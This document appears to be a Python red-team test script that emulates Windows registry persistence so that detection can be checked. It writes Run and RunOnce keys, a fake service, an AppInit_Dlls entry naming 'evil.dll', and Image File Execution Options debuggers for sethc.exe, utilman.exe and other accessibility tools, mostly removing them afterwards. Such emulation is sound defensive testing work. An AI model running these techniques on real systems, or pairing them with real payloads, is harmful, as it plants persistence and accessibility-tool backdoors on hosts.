# Name: Registry persistence creation
# rta: registry_persistence_create.py
# ATT&CK: T1015, T1103
# Description: Creates registry persistence for mock malware in Run and RunOnce keys, Services and debuggers.

import winreg
import time
import common

TARGET_APP = common.get_path("bin", "myapp.exe")


def pause():
    time.sleep(0.5)


def write_reg_string(hive, key, value, data, delete=True):
    hkey = winreg.CreateKey(hive, key)
    key = key.rstrip('\\')
    common.log("Writing to registry %s\\%s -> %s" % (key, value, data))
    winreg.SetValueEx(hkey, value, 0, winreg.REG_SZ, data)
    stored, code = winreg.QueryValueEx(hkey, value)
    if data != stored:
        common.log("Wrote %s but retrieved %s" % (data, stored), log_type="-")

    if delete:
        pause()
        common.log("Removing %s\\%s" % (key, value), log_type="-")
        winreg.DeleteValue(hkey, value)

    hkey.Close()
    pause()
    print("")


@common.dependencies(TARGET_APP)
def main():
    common.log("Suspicious Registry Persistence")

    for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
        write_reg_string(hive, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", "RunOnceTest", TARGET_APP)
        write_reg_string(hive, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "RunTest", TARGET_APP)

    # create Services subkey for "ServiceTest"
    common.log("Creating ServiceTest registry key")
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\ServiceTest\\")

    # create "ServiceTest" data values
    common.log("Updating ServiceTest metadata")
    winreg.SetValueEx(hkey, "Description", 0, winreg.REG_SZ, "A fake service")
    winreg.SetValueEx(hkey, "DisplayName", 0, winreg.REG_SZ, "ServiceTest Service")
    winreg.SetValueEx(hkey, "ImagePath", 0, winreg.REG_SZ, "c:\\ServiceTest.exe")
    winreg.SetValueEx(hkey, "ServiceDLL", 0, winreg.REG_SZ, "C:\\ServiceTest.dll")

    # modify contents of ServiceDLL and ImagePath
    common.log("Modifying ServiceTest binary")
    winreg.SetValueEx(hkey, "ImagePath", 0, winreg.REG_SZ, "c:\\ServiceTestMod.exe")
    winreg.SetValueEx(hkey, "ServiceDLL", 0, winreg.REG_SZ, "c:\\ServiceTestMod.dll")

    hkey.Close()
    pause()

    # delete Service subkey for "ServiceTest"
    common.log("Removing ServiceTest", log_type="-")
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\")
    winreg.DeleteKeyEx(hkey, "ServiceTest")

    hkey.Close()
    pause()

    # Additional persistence
    hklm = winreg.HKEY_LOCAL_MACHINE
    common.log("Adding AppInit DLL")
    windows_base = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\"
    write_reg_string(hklm, windows_base, "AppInit_Dlls", "evil.dll", delete=False)
    write_reg_string(hklm, windows_base, "AppInit_Dlls", "", delete=False)

    hkey.Close()
    pause()

    debugger_targets = ["normalprogram.exe", "sethc.exe", "utilman.exe", "magnify.exe",
                        "narrator.exe", "osk.exe", "displayswitch.exe", "atbroker.exe"]

    for victim in debugger_targets:
        common.log("Registering Image File Execution Options debugger for %s -> %s" % (victim, TARGET_APP))
        base_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s" % victim
        write_reg_string(winreg.HKEY_LOCAL_MACHINE, base_key, "Debugger", TARGET_APP, delete=True)


if __name__ == "__main__":
    exit(main())